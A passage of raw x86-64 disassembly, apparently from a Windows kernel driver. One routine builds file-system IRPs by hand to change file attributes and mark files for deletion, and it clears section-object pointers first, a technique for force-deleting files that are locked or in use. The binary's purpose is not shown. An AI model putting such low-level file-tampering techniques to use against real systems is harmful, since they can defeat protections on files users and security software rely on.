   140001e66:	5e                   	pop    %rsi
   140001e67:	c3                   	ret
   140001e68:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001e6d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001e72:	57                   	push   %rdi
   140001e73:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001e7a:	48 8b 05 2f 99 00 00 	mov    0x992f(%rip),%rax        # 0x14000b7b0
   140001e81:	48 33 c4             	xor    %rsp,%rax
   140001e84:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140001e8b:	00 
   140001e8c:	48 8b d9             	mov    %rcx,%rbx
   140001e8f:	ff 15 5b 62 00 00    	call   *0x625b(%rip)        # 0x1400080f0
   140001e95:	b2 01                	mov    $0x1,%dl
   140001e97:	48 8b f0             	mov    %rax,%rsi
   140001e9a:	8a 48 4c             	mov    0x4c(%rax),%cl
   140001e9d:	ff 15 2d 63 00 00    	call   *0x632d(%rip)        # 0x1400081d0
   140001ea3:	48 8b f8             	mov    %rax,%rdi
   140001ea6:	48 85 c0             	test   %rax,%rax
   140001ea9:	75 13                	jne    0x140001ebe
   140001eab:	48 8b cb             	mov    %rbx,%rcx
   140001eae:	ff 15 4c 62 00 00    	call   *0x624c(%rip)        # 0x140008100
   140001eb4:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   140001eb9:	e9 d4 00 00 00       	jmp    0x140001f92
   140001ebe:	45 33 c0             	xor    %r8d,%r8d
   140001ec1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001ec6:	41 8d 50 01          	lea    0x1(%r8),%edx
   140001eca:	ff 15 50 64 00 00    	call   *0x6450(%rip)        # 0x140008320
   140001ed0:	33 d2                	xor    %edx,%edx
   140001ed2:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140001ed7:	44 8d 42 28          	lea    0x28(%rdx),%r8d
   140001edb:	e8 a0 55 00 00       	call   0x140007480
   140001ee0:	c7 44 24 78 80 00 00 	movl   $0x80,0x78(%rsp)
   140001ee7:	00 
   140001ee8:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140001eed:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140001ef1:	48 8d 0d c8 00 00 00 	lea    0xc8(%rip),%rcx        # 0x140001fc0
   140001ef8:	48 89 9f c0 00 00 00 	mov    %rbx,0xc0(%rdi)
   140001eff:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001f04:	48 89 47 50          	mov    %rax,0x50(%rdi)
   140001f08:	48 8b d7             	mov    %rdi,%rdx
   140001f0b:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140001f10:	48 89 47 48          	mov    %rax,0x48(%rdi)
   140001f14:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   140001f1b:	00 00 
   140001f1d:	48 89 87 98 00 00 00 	mov    %rax,0x98(%rdi)
   140001f24:	48 8b 87 b8 00 00 00 	mov    0xb8(%rdi),%rax
   140001f2b:	c6 47 40 00          	movb   $0x0,0x40(%rdi)
   140001f2f:	c6 40 b8 06          	movb   $0x6,-0x48(%rax)
   140001f33:	48 89 70 e0          	mov    %rsi,-0x20(%rax)
   140001f37:	48 89 58 e8          	mov    %rbx,-0x18(%rax)
   140001f3b:	c7 40 c0 28 00 00 00 	movl   $0x28,-0x40(%rax)
   140001f42:	c7 40 c8 04 00 00 00 	movl   $0x4,-0x38(%rax)
   140001f49:	48 89 58 d0          	mov    %rbx,-0x30(%rax)
   140001f4d:	48 8b 87 b8 00 00 00 	mov    0xb8(%rdi),%rax
   140001f54:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   140001f58:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001f5d:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140001f61:	48 8b ce             	mov    %rsi,%rcx
   140001f64:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   140001f68:	ff 15 92 63 00 00    	call   *0x6392(%rip)        # 0x140008300
   140001f6e:	3d 03 01 00 00       	cmp    $0x103,%eax
   140001f73:	75 19                	jne    0x140001f8e
   140001f75:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001f7b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001f80:	41 b1 01             	mov    $0x1,%r9b
   140001f83:	45 33 c0             	xor    %r8d,%r8d
   140001f86:	33 d2                	xor    %edx,%edx
   140001f88:	ff 15 82 63 00 00    	call   *0x6382(%rip)        # 0x140008310
   140001f8e:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140001f92:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140001f99:	00 
   140001f9a:	48 33 cc             	xor    %rsp,%rcx
   140001f9d:	e8 0e 51 00 00       	call   0x1400070b0
   140001fa2:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001fa9:	00 
   140001faa:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140001fae:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140001fb2:	49 8b e3             	mov    %r11,%rsp
   140001fb5:	5f                   	pop    %rdi
   140001fb6:	c3                   	ret
   140001fb7:	cc                   	int3
   140001fb8:	cc                   	int3
   140001fb9:	cc                   	int3
   140001fba:	cc                   	int3
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	40 53                	rex push %rbx
   140001fc2:	48 83 ec 20          	sub    $0x20,%rsp
   140001fc6:	48 8b 4a 48          	mov    0x48(%rdx),%rcx
   140001fca:	48 8b da             	mov    %rdx,%rbx
   140001fcd:	8b 42 30             	mov    0x30(%rdx),%eax
   140001fd0:	45 33 c0             	xor    %r8d,%r8d
   140001fd3:	89 01                	mov    %eax,(%rcx)
   140001fd5:	48 8b 4a 48          	mov    0x48(%rdx),%rcx
   140001fd9:	48 8b 42 38          	mov    0x38(%rdx),%rax
   140001fdd:	33 d2                	xor    %edx,%edx
   140001fdf:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001fe3:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140001fe7:	ff 15 2b 63 00 00    	call   *0x632b(%rip)        # 0x140008318
   140001fed:	48 8b cb             	mov    %rbx,%rcx
   140001ff0:	ff 15 f2 60 00 00    	call   *0x60f2(%rip)        # 0x1400080e8
   140001ff6:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
   140001ffb:	48 83 c4 20          	add    $0x20,%rsp
   140001fff:	5b                   	pop    %rbx
   140002000:	c3                   	ret
   140002001:	cc                   	int3
   140002002:	cc                   	int3
   140002003:	cc                   	int3
   140002004:	40 53                	rex push %rbx
   140002006:	48 83 ec 30          	sub    $0x30,%rsp
   14000200a:	4c 8b 05 1f 61 00 00 	mov    0x611f(%rip),%r8        # 0x140008130
   140002011:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140002016:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   14000201c:	45 33 c9             	xor    %r9d,%r9d
   14000201f:	ba 00 00 01 00       	mov    $0x10000,%edx
   140002024:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002029:	4d 8b 00             	mov    (%r8),%r8
   14000202c:	ff 15 c6 60 00 00    	call   *0x60c6(%rip)        # 0x1400080f8
   140002032:	85 c0                	test   %eax,%eax
   140002034:	78 19                	js     0x14000204f
   140002036:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000203b:	e8 18 00 00 00       	call   0x140002058
   140002040:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002045:	8b d8                	mov    %eax,%ebx
   140002047:	ff 15 b3 60 00 00    	call   *0x60b3(%rip)        # 0x140008100
   14000204d:	8b c3                	mov    %ebx,%eax
   14000204f:	48 83 c4 30          	add    $0x30,%rsp
   140002053:	5b                   	pop    %rbx
   140002054:	c3                   	ret
   140002055:	cc                   	int3
   140002056:	cc                   	int3
   140002057:	cc                   	int3
   140002058:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000205d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002062:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002067:	57                   	push   %rdi
   140002068:	41 56                	push   %r14
   14000206a:	41 57                	push   %r15
   14000206c:	48 83 ec 60          	sub    $0x60,%rsp
   140002070:	48 8b d9             	mov    %rcx,%rbx
   140002073:	33 ff                	xor    %edi,%edi
   140002075:	33 ed                	xor    %ebp,%ebp
   140002077:	45 33 f6             	xor    %r14d,%r14d
   14000207a:	e8 e9 fd ff ff       	call   0x140001e68
   14000207f:	48 8b cb             	mov    %rbx,%rcx
   140002082:	ff 15 68 60 00 00    	call   *0x6068(%rip)        # 0x1400080f0
   140002088:	b2 01                	mov    $0x1,%dl
   14000208a:	4c 8b f8             	mov    %rax,%r15
   14000208d:	8a 48 4c             	mov    0x4c(%rax),%cl
   140002090:	ff 15 3a 61 00 00    	call   *0x613a(%rip)        # 0x1400081d0
   140002096:	48 8b f0             	mov    %rax,%rsi
   140002099:	48 85 c0             	test   %rax,%rax
   14000209c:	75 13                	jne    0x1400020b1
   14000209e:	48 8b cb             	mov    %rbx,%rcx
   1400020a1:	ff 15 59 60 00 00    	call   *0x6059(%rip)        # 0x140008100
   1400020a7:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   1400020ac:	e9 22 01 00 00       	jmp    0x1400021d3
   1400020b1:	45 33 c0             	xor    %r8d,%r8d
   1400020b4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020b9:	41 8d 50 01          	lea    0x1(%r8),%edx
   1400020bd:	ff 15 5d 62 00 00    	call   *0x625d(%rip)        # 0x140008320
   1400020c3:	c6 84 24 88 00 00 00 	movb   $0x1,0x88(%rsp)
   1400020ca:	01 
   1400020cb:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   1400020d2:	00 
   1400020d3:	48 89 46 18          	mov    %rax,0x18(%rsi)
   1400020d7:	48 8d 0d e2 fe ff ff 	lea    -0x11e(%rip),%rcx        # 0x140001fc0
   1400020de:	48 89 9e c0 00 00 00 	mov    %rbx,0xc0(%rsi)
   1400020e5:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400020ea:	48 89 46 50          	mov    %rax,0x50(%rsi)
   1400020ee:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400020f3:	48 89 46 48          	mov    %rax,0x48(%rsi)
   1400020f7:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   1400020fe:	00 00 
   140002100:	48 89 86 98 00 00 00 	mov    %rax,0x98(%rsi)
   140002107:	48 8b 86 b8 00 00 00 	mov    0xb8(%rsi),%rax
   14000210e:	40 88 7e 40          	mov    %dil,0x40(%rsi)
   140002112:	c6 40 b8 06          	movb   $0x6,-0x48(%rax)
   140002116:	4c 89 78 e0          	mov    %r15,-0x20(%rax)
   14000211a:	48 89 58 e8          	mov    %rbx,-0x18(%rax)
   14000211e:	c7 40 c0 01 00 00 00 	movl   $0x1,-0x40(%rax)
   140002125:	c7 40 c8 0d 00 00 00 	movl   $0xd,-0x38(%rax)
   14000212c:	48 89 58 d0          	mov    %rbx,-0x30(%rax)
   140002130:	48 8b 86 b8 00 00 00 	mov    0xb8(%rsi),%rax
   140002137:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   14000213b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002140:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140002144:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   140002148:	48 8b 43 28          	mov    0x28(%rbx),%rax
   14000214c:	48 85 c0             	test   %rax,%rax
   14000214f:	74 2f                	je     0x140002180
   140002151:	48 8b 48 10          	mov    0x10(%rax),%rcx
   140002155:	48 85 c9             	test   %rcx,%rcx
   140002158:	74 07                	je     0x140002161
   14000215a:	48 21 78 10          	and    %rdi,0x10(%rax)
   14000215e:	4c 8b f1             	mov    %rcx,%r14
   140002161:	48 8b 08             	mov    (%rax),%rcx
   140002164:	48 85 c9             	test   %rcx,%rcx
   140002167:	74 06                	je     0x14000216f
   140002169:	48 21 38             	and    %rdi,(%rax)
   14000216c:	48 8b e9             	mov    %rcx,%rbp
   14000216f:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140002173:	48 85 c9             	test   %rcx,%rcx
   140002176:	74 08                	je     0x140002180
   140002178:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   14000217d:	48 8b f9             	mov    %rcx,%rdi
   140002180:	48 8b d6             	mov    %rsi,%rdx
   140002183:	49 8b cf             	mov    %r15,%rcx
   140002186:	ff 15 74 61 00 00    	call   *0x6174(%rip)        # 0x140008300
   14000218c:	3d 03 01 00 00       	cmp    $0x103,%eax
   140002191:	75 19                	jne    0x1400021ac
   140002193:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140002199:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000219e:	41 b1 01             	mov    $0x1,%r9b
   1400021a1:	45 33 c0             	xor    %r8d,%r8d
   1400021a4:	33 d2                	xor    %edx,%edx
   1400021a6:	ff 15 64 61 00 00    	call   *0x6164(%rip)        # 0x140008310
   1400021ac:	48 8b 43 28          	mov    0x28(%rbx),%rax
   1400021b0:	48 85 c0             	test   %rax,%rax
   1400021b3:	74 1a                	je     0x1400021cf
   1400021b5:	4d 85 f6             	test   %r14,%r14
   1400021b8:	74 04                	je     0x1400021be
   1400021ba:	4c 89 70 10          	mov    %r14,0x10(%rax)
   1400021be:	48 85 ed             	test   %rbp,%rbp
   1400021c1:	74 03                	je     0x1400021c6
   1400021c3:	48 89 28             	mov    %rbp,(%rax)
   1400021c6:	48 85 ff             	test   %rdi,%rdi
   1400021c9:	74 04                	je     0x1400021cf
   1400021cb:	48 89 78 08          	mov    %rdi,0x8(%rax)
   1400021cf:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400021d3:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   1400021d8:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400021dc:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   1400021e0:	49 8b 73 38          	mov    0x38(%r11),%rsi
   1400021e4:	49 8b e3             	mov    %r11,%rsp
   1400021e7:	41 5f                	pop    %r15
   1400021e9:	41 5e                	pop    %r14
   1400021eb:	5f                   	pop    %rdi
   1400021ec:	c3                   	ret
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	4c 8b dc             	mov    %rsp,%r11
   1400021f3:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   1400021f7:	55                   	push   %rbp
   1400021f8:	56                   	push   %rsi
   1400021f9:	57                   	push   %rdi
   1400021fa:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140002201:	4c 8b c9             	mov    %rcx,%r9
   140002204:	41 8b f0             	mov    %r8d,%esi
   140002207:	33 c0                	xor    %eax,%eax
   140002209:	49 8d 7b b8          	lea    -0x48(%r11),%rdi
   14000220d:	33 db                	xor    %ebx,%ebx
   14000220f:	41 89 43 0c          	mov    %eax,0xc(%r11)
   140002213:	48 8b ea             	mov    %rdx,%rbp
   140002216:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000221b:	8d 4b 30             	lea    0x30(%rbx),%ecx
   14000221e:	f3 aa                	rep stos %al,(%rdi)
   140002220:	49 8b c9             	mov    %r9,%rcx
   140002223:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   140002227:	e8 50 f9 ff ff       	call   0x140001b7c
   14000222c:	48 8b f8             	mov    %rax,%rdi
   14000222f:	48 85 c0             	test   %rax,%rax
   140002232:	74 77                	je     0x1400022ab
   140002234:	44 8d 4b 08          	lea    0x8(%rbx),%r9d
   140002238:	48 89 b4 24 b0 00 00 	mov    %rsi,0xb0(%rsp)
   14000223f:	00 
   140002240:	4c 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%r8
   140002247:	00 
   140002248:	c7 44 24 20 14 00 00 	movl   $0x14,0x20(%rsp)
   14000224f:	00 
   140002250:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002255:	48 8b c8             	mov    %rax,%rcx
   140002258:	ff 15 b2 5e 00 00    	call   *0x5eb2(%rip)        # 0x140008110
   14000225e:	85 c0                	test   %eax,%eax
   140002260:	75 49                	jne    0x1400022ab
   140002262:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140002267:	48 8d 84 24 c8 00 00 	lea    0xc8(%rsp),%rax
   14000226e:	00 
   14000226f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002274:	45 33 c9             	xor    %r9d,%r9d
   140002277:	89 74 24 30          	mov    %esi,0x30(%rsp)
   14000227b:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002280:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140002285:	45 33 c0             	xor    %r8d,%r8d
   140002288:	33 d2                	xor    %edx,%edx
   14000228a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000228f:	48 8b cf             	mov    %rdi,%rcx
   140002292:	48 89 9c 24 c8 00 00 	mov    %rbx,0xc8(%rsp)
   140002299:	00 
   14000229a:	ff 15 80 5e 00 00    	call   *0x5e80(%rip)        # 0x140008120
   1400022a0:	48 8b cf             	mov    %rdi,%rcx
   1400022a3:	8b d8                	mov    %eax,%ebx
   1400022a5:	ff 15 7d 5e 00 00    	call   *0x5e7d(%rip)        # 0x140008128
   1400022ab:	8b c3                	mov    %ebx,%eax
   1400022ad:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   1400022b4:	00 
   1400022b5:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400022bc:	5f                   	pop    %rdi
   1400022bd:	5e                   	pop    %rsi
   1400022be:	5d                   	pop    %rbp
   1400022bf:	c3                   	ret
   1400022c0:	40 53                	rex push %rbx
   1400022c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400022c6:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   1400022cb:	48 8b d9             	mov    %rcx,%rbx
   1400022ce:	74 08                	je     0x1400022d8
   1400022d0:	48 8b 01             	mov    (%rcx),%rax
   1400022d3:	48 85 c0             	test   %rax,%rax
   1400022d6:	75 2d                	jne    0x140002305
   1400022d8:	48 83 c4 20          	add    $0x20,%rsp
   1400022dc:	5b                   	pop    %rbx
   1400022dd:	c3                   	ret
   1400022de:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   1400022e2:	75 28                	jne    0x14000230c
   1400022e4:	48 8b 08             	mov    (%rax),%rcx
   1400022e7:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   1400022eb:	75 1f                	jne    0x14000230c
   1400022ed:	48 89 0b             	mov    %rcx,(%rbx)
   1400022f0:	ba 78 61 64 76       	mov    $0x76646178,%edx
   1400022f5:	48 89 59 08          	mov    %rbx,0x8(%rcx)
   1400022f9:	48 8b c8             	mov    %rax,%rcx
   1400022fc:	ff 15 3e 60 00 00    	call   *0x603e(%rip)        # 0x140008340
   140002302:	48 8b 03             	mov    (%rbx),%rax
   140002305:	48 3b c3             	cmp    %rbx,%rax
   140002308:	75 d4                	jne    0x1400022de
   14000230a:	eb cc                	jmp    0x1400022d8
   14000230c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002311:	cd 29                	int    $0x29
   140002313:	cc                   	int3
   140002314:	48 85 c9             	test   %rcx,%rcx
   140002317:	74 07                	je     0x140002320
   140002319:	48 89 49 08          	mov    %rcx,0x8(%rcx)
   14000231d:	48 89 09             	mov    %rcx,(%rcx)
   140002320:	c3                   	ret
   140002321:	cc                   	int3
   140002322:	cc                   	int3
   140002323:	cc                   	int3
   140002324:	48 83 ec 28          	sub    $0x28,%rsp
   140002328:	48 83 3d 48 95 00 00 	cmpq   $0x0,0x9548(%rip)        # 0x14000b878
   14000232f:	00 
   140002330:	c6 05 21 95 00 00 01 	movb   $0x1,0x9521(%rip)        # 0x14000b858
   140002337:	74 23                	je     0x14000235c
   140002339:	48 8d 0d 20 95 00 00 	lea    0x9520(%rip),%rcx        # 0x14000b860
   140002340:	e8 7b 31 00 00       	call   0x1400054c0
   140002345:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000234a:	e8 cd 2b 00 00       	call   0x140004f1c
   14000234f:	48 8b 0d 22 95 00 00 	mov    0x9522(%rip),%rcx        # 0x14000b878
   140002356:	ff 15 cc 5d 00 00    	call   *0x5dcc(%rip)        # 0x140008128
   14000235c:	48 83 c4 28          	add    $0x28,%rsp
   140002360:	c3                   	ret
   140002361:	cc                   	int3
   140002362:	cc                   	int3
   140002363:	cc                   	int3
   140002364:	cc                   	int3
   140002365:	cc                   	int3
   140002366:	cc                   	int3
   140002367:	cc                   	int3
   140002368:	cc                   	int3
   140002369:	cc                   	int3
   14000236a:	cc                   	int3
   14000236b:	cc                   	int3
   14000236c:	cc                   	int3
   14000236d:	cc                   	int3
   14000236e:	cc                   	int3
   14000236f:	cc                   	int3
   140002370:	48 83 ec 28          	sub    $0x28,%rsp
   140002374:	ff 15 be 5d 00 00    	call   *0x5dbe(%rip)        # 0x140008138
   14000237a:	65 48 8b 0c 25 88 01 	mov    %gs:0x188,%rcx
   140002381:	00 00 
   140002383:	ba 05 00 00 00       	mov    $0x5,%edx
   140002388:	ff 15 c2 5d 00 00    	call   *0x5dc2(%rip)        # 0x140008150
   14000238e:	65 48 8b 0c 25 88 01 	mov    %gs:0x188,%rcx
   140002395:	00 00 
   140002397:	e8 60 11 00 00       	call   0x1400034fc
   14000239c:	b9 88 13 00 00       	mov    $0x1388,%ecx
   1400023a1:	e8 76 2b 00 00       	call   0x140004f1c
   1400023a6:	e8 49 18 00 00       	call   0x140003bf4
   1400023ab:	41 b0 01             	mov    $0x1,%r8b
   1400023ae:	48 8d 0d 6b 01 00 00 	lea    0x16b(%rip),%rcx        # 0x140002520
   1400023b5:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400023ba:	e8 ed 17 00 00       	call   0x140003bac
   1400023bf:	41 b0 01             	mov    $0x1,%r8b
   1400023c2:	48 8d 0d 77 01 00 00 	lea    0x177(%rip),%rcx        # 0x140002540
   1400023c9:	ba 3c 00 00 00       	mov    $0x3c,%edx
   1400023ce:	e8 d9 17 00 00       	call   0x140003bac
   1400023d3:	41 b0 01             	mov    $0x1,%r8b
   1400023d6:	48 8d 0d c3 00 00 00 	lea    0xc3(%rip),%rcx        # 0x1400024a0
   1400023dd:	ba 10 0e 00 00       	mov    $0xe10,%edx
   1400023e2:	e8 c5 17 00 00       	call   0x140003bac
   1400023e7:	41 b0 01             	mov    $0x1,%r8b
   1400023ea:	48 8d 0d 9f 00 00 00 	lea    0x9f(%rip),%rcx        # 0x140002490
   1400023f1:	ba 10 0e 00 00       	mov    $0xe10,%edx
   1400023f6:	e8 b1 17 00 00       	call   0x140003bac
   1400023fb:	41 b0 01             	mov    $0x1,%r8b
   1400023fe:	48 8d 0d db 00 00 00 	lea    0xdb(%rip),%rcx        # 0x1400024e0
   140002405:	ba 1e 00 00 00       	mov    $0x1e,%edx
   14000240a:	e8 9d 17 00 00       	call   0x140003bac
   14000240f:	33 c9                	xor    %ecx,%ecx
   140002411:	e8 ce f6 ff ff       	call   0x140001ae4
   140002416:	48 8b c8             	mov    %rax,%rcx
   140002419:	e8 46 1a 00 00       	call   0x140003e64
   14000241e:	eb 13                	jmp    0x140002433
   140002420:	80 3d 31 94 00 00 00 	cmpb   $0x0,0x9431(%rip)        # 0x14000b858
   140002427:	75 3c                	jne    0x140002465
   140002429:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000242e:	e8 e9 2a 00 00       	call   0x140004f1c
   140002433:	e8 68 22 00 00       	call   0x1400046a0
   140002438:	84 c0                	test   %al,%al
   14000243a:	74 e4                	je     0x140002420
   14000243c:	eb 1e                	jmp    0x14000245c
   14000243e:	e8 85 1b 00 00       	call   0x140003fc8
   140002443:	e8 90 1f 00 00       	call   0x1400043d8
   140002448:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000244d:	e8 76 18 00 00       	call   0x140003cc8
   140002452:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   140002457:	e8 c0 2a 00 00       	call   0x140004f1c
   14000245c:	80 3d f5 93 00 00 00 	cmpb   $0x0,0x93f5(%rip)        # 0x14000b858
   140002463:	74 d9                	je     0x14000243e
   140002465:	ff 15 d5 5c 00 00    	call   *0x5cd5(%rip)        # 0x140008140
   14000246b:	48 8d 0d ee 93 00 00 	lea    0x93ee(%rip),%rcx        # 0x14000b860
   140002472:	e8 0d 2f 00 00       	call   0x140005384
   140002477:	33 c9                	xor    %ecx,%ecx
   140002479:	48 83 c4 28          	add    $0x28,%rsp
   14000247d:	48 ff 25 c4 5c 00 00 	rex.W jmp *0x5cc4(%rip)        # 0x140008148
   140002484:	cc                   	int3
   140002485:	cc                   	int3
   140002486:	cc                   	int3
   140002487:	cc                   	int3
   140002488:	cc                   	int3
   140002489:	cc                   	int3
   14000248a:	cc                   	int3
   14000248b:	cc                   	int3
   14000248c:	cc                   	int3
   14000248d:	cc                   	int3
   14000248e:	cc                   	int3
   14000248f:	cc                   	int3
   140002490:	e9 ff 22 00 00       	jmp    0x140004794
   140002495:	cc                   	int3
   140002496:	cc                   	int3
   140002497:	cc                   	int3
   140002498:	cc                   	int3
   140002499:	cc                   	int3
   14000249a:	cc                   	int3
   14000249b:	cc                   	int3
   14000249c:	cc                   	int3
   14000249d:	cc                   	int3
   14000249e:	cc                   	int3
   14000249f:	cc                   	int3
   1400024a0:	40 53                	rex push %rbx
   1400024a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400024a6:	33 c9                	xor    %ecx,%ecx
   1400024a8:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   1400024ad:	e8 96 19 00 00       	call   0x140003e48
   1400024b2:	48 8b c8             	mov    %rax,%rcx
   1400024b5:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400024ba:	b2 01                	mov    $0x1,%dl
   1400024bc:	e8 33 14 00 00       	call   0x1400038f4
   1400024c1:	80 7c 24 30 00       	cmpb   $0x0,0x30(%rsp)
   1400024c6:	8a d8                	mov    %al,%bl
   1400024c8:	74 0c                	je     0x1400024d6
   1400024ca:	48 8d 0d 4f 00 00 00 	lea    0x4f(%rip),%rcx        # 0x140002520
   1400024d1:	e8 2a 17 00 00       	call   0x140003c00
   1400024d6:	8a c3                	mov    %bl,%al
   1400024d8:	48 83 c4 20          	add    $0x20,%rsp
   1400024dc:	5b                   	pop    %rbx
   1400024dd:	c3                   	ret
   1400024de:	cc                   	int3
   1400024df:	cc                   	int3
   1400024e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400024e4:	8b 0d 9a 93 00 00    	mov    0x939a(%rip),%ecx        # 0x14000b884
   1400024ea:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400024ed:	74 25                	je     0x140002514
   1400024ef:	ff c1                	inc    %ecx
   1400024f1:	89 0d 8d 93 00 00    	mov    %ecx,0x938d(%rip)        # 0x14000b884
   1400024f7:	83 f9 0a             	cmp    $0xa,%ecx
   1400024fa:	75 18                	jne    0x140002514
   1400024fc:	83 0d 81 93 00 00 ff 	orl    $0xffffffff,0x9381(%rip)        # 0x14000b884
   140002503:	48 8d 0d d6 ff ff ff 	lea    -0x2a(%rip),%rcx        # 0x1400024e0
   14000250a:	ba 58 02 00 00       	mov    $0x258,%edx
   14000250f:	e8 4c 17 00 00       	call   0x140003c60
   140002514:	e8 37 ee ff ff       	call   0x140001350
   140002519:	b0 01                	mov    $0x1,%al
   14000251b:	48 83 c4 28          	add    $0x28,%rsp
   14000251f:	c3                   	ret
   140002520:	48 83 ec 28          	sub    $0x28,%rsp
   140002524:	e8 db 0f 00 00       	call   0x140003504
   140002529:	84 c0                	test   %al,%al
   14000252b:	75 0a                	jne    0x140002537
   14000252d:	e8 42 15 00 00       	call   0x140003a74
   140002532:	e8 49 11 00 00       	call   0x140003680
   140002537:	48 83 c4 28          	add    $0x28,%rsp
   14000253b:	e9 c4 0f 00 00       	jmp    0x140003504
   140002540:	e9 67 25 00 00       	jmp    0x140004aac
   140002545:	cc                   	int3
   140002546:	cc                   	int3
   140002547:	cc                   	int3
   140002548:	cc                   	int3
   140002549:	cc                   	int3
   14000254a:	cc                   	int3
   14000254b:	cc                   	int3
   14000254c:	cc                   	int3
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	40 53                	rex push %rbx
   140002552:	48 83 ec 20          	sub    $0x20,%rsp
   140002556:	33 db                	xor    %ebx,%ebx
   140002558:	e8 6f 00 00 00       	call   0x1400025cc
   14000255d:	84 c0                	test   %al,%al
   14000255f:	75 0a                	jne    0x14000256b
   140002561:	e8 2e 00 00 00       	call   0x140002594
   140002566:	bb 01 00 00 c0       	mov    $0xc0000001,%ebx
   14000256b:	8b c3                	mov    %ebx,%eax
   14000256d:	48 83 c4 20          	add    $0x20,%rsp
   140002571:	5b                   	pop    %rbx
   140002572:	c3                   	ret
   140002573:	cc                   	int3
   140002574:	cc                   	int3
   140002575:	cc                   	int3
   140002576:	cc                   	int3
   140002577:	cc                   	int3
   140002578:	cc                   	int3
   140002579:	cc                   	int3
   14000257a:	cc                   	int3
   14000257b:	cc                   	int3
   14000257c:	cc                   	int3
   14000257d:	cc                   	int3
   14000257e:	cc                   	int3
   14000257f:	cc                   	int3
   140002580:	48 83 ec 28          	sub    $0x28,%rsp
   140002584:	e8 9b fd ff ff       	call   0x140002324
   140002589:	48 83 c4 28          	add    $0x28,%rsp
